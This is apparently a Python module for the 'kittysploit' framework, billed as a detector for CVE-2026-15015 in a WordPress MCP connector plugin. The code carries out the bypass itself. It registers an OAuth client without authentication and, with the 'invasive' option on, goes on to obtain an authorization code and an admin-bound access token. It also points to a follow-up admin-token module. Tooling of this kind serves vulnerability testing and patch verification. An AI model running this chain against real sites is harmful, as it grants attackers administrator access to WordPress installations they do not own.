#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MountDev AI MCP Connector <= 1.6.1 OAuth bypass (CVE-2026-15015)."""

import json
import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "mountdev-ai-mcp-connector"
_VULN_HIGH = (1, 6, 1)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "MountDev MCP CVE-2026-15015 detect",
        "description": (
            "Detects CVE-2026-15015 when /mcp-register returns OAuth client credentials "
            "and authorize endpoint auto-issues admin-bound codes."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-15015",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-15015",
            "https://github.com/les-k/wp-secure-mcp",
        ],
        "modules": ["auxiliary/admin/http/mountdev_mcp_cve_2026_15015_admin_token"],
        "tags": ["web", "scanner", "wordpress", "oauth", "mcp", "cve-2026-15015"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/mountdev_mcp_cve_2026_15015_admin_token"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    fetch_token = OptBool(
        False,
        "Complete OAuth chain and confirm access_token (invasive)",
        required=False,
    )

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _site_root(self) -> str:
        def opt(name, default):
            o = getattr(self, name, None)
            if o is None:
                return default
            return o.value if hasattr(o, "value") else o

        from lib.scanner.target_utils import normalize_scanner_target

        host, url_port, url_ssl = normalize_scanner_target(str(opt("target", "") or ""))
        host = host or str(opt("target", "localhost"))
        port = int(url_port if url_port is not None else opt("port", 443))
        ssl = url_ssl if url_ssl is not None else bool(opt("ssl", True))
        proto = "https" if ssl or port == 443 else "http"
        if (proto == "https" and port == 443) or (proto == "http" and port == 80):
            return f"{proto}://{host}/"
        return f"{proto}://{host}:{port}/"

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        root = self._site_root()
        reg = self.http_request(
            method="POST",
            path=self._join("/mcp-register"),
            headers={"Content-Type": "application/json"},
            data=json.dumps(
                {
                    "redirect_uris": [root.rstrip("/")],
                    "client_name": f"ks{secrets.token_hex(4)}",
                    "token_endpoint_auth_method": "client_secret_post",
                }
            ),
            allow_redirects=False,
        )
        if not reg or int(reg.status_code or 0) not in (200, 201):
            return False
        body = reg.text or ""
        if "client_id" not in body or "client_secret" not in body:
            return False
        cid = re.search(r'"client_id"\s*:\s*"([^"]+)"', body)
        csec = re.search(r'"client_secret"\s*:\s*"([^"]+)"', body)
        if not cid or not csec:
            return False
        if not self.fetch_token:
            self.set_info(
                severity="critical",
                reason="Unauthenticated /mcp-register issued OAuth client",
                path="/mcp-register",
                cve="CVE-2026-15015",
            )
            return True
        auth = self.http_request(
            method="GET",
            path=self._join("/wp-json/mountdev-ai-mcp-connector/v1/oauth/authorize"),
            params={
                "client_id": cid.group(1),
                "redirect_uri": root.rstrip("/"),
                "response_type": "code",
                "scope": "mcp",
            },
            allow_redirects=False,
        )
        loc = (auth.headers.get("Location") or "") if auth else ""
        code_m = re.search(r"code=([a-zA-Z0-9]+)", loc)
        if not code_m:
            return False
        tok = self.http_request(
            method="POST",
            path=self._join("/mcp-token"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "grant_type": "authorization_code",
                "code": code_m.group(1),
                "client_id": cid.group(1),
                "client_secret": csec.group(1),
            },
            allow_redirects=False,
        )
        if tok and int(tok.status_code or 0) == 200 and "access_token" in (tok.text or ""):
            self.set_info(
                severity="critical",
                reason="Admin-bound OAuth access_token issued without authentication",
                cve="CVE-2026-15015",
            )
            return True
        return False
